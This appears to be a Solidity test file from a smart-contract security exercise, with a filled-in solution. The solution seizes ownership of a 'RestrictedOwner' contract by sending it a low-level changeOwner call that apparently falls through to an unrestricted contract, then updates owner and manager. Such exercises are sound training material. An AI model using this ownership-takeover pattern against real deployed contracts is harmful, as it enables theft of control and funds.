// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "src/call-attacks-1/RestrictedOwner.sol";
import "src/call-attacks-1/UnrestrictedOwner.sol";

/**
 * @dev run "forge test -vvv --match-contract CA1"
 */
contract TestCA1 is Test {
    address deployer = makeAddr("deployer");
    address user = makeAddr("user");
    address attacker = makeAddr("attacker");

    UnrestrictedOwner unrestrictedOwner;
    RestrictedOwner restrictedOwner;

    function setUp() public {
        /* SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */
        vm.startPrank(deployer);
        unrestrictedOwner = new UnrestrictedOwner();
        restrictedOwner = new RestrictedOwner(address(unrestrictedOwner));
        restrictedOwner.owner(); // To keep prank happy

        // Any user can take ownership on `UnrestrictedOwner` contract
        vm.startPrank(user);
        unrestrictedOwner.changeOwner(user);
        assertEq(unrestrictedOwner.owner(), user);

        // Any user can't take ownership on `RestrictedOwner` contract
        vm.expectRevert("Not owner!");
        restrictedOwner.updateSettings(user, user);
        assertEq(restrictedOwner.owner(), deployer);
        assertEq(restrictedOwner.manager(), deployer);
    }

    function testCallAttack1() public {
        /**
         * CODE YOUR SOLUTION HERE
         */
        vm.startPrank(attacker);
        unrestrictedOwner.changeOwner(attacker);
        (bool success,) = address(restrictedOwner).call(abi.encodeWithSignature("changeOwner(address)", attacker));
        require(success, "Call Failed 1");

        restrictedOwner.updateSettings(attacker, attacker);

        /**
         * SUCCESS CONDITIONS - DON'T CHANGE ANYTHING HERE
         */
        assertEq(restrictedOwner.owner(), attacker);
        assertEq(restrictedOwner.manager(), attacker);
    }
}
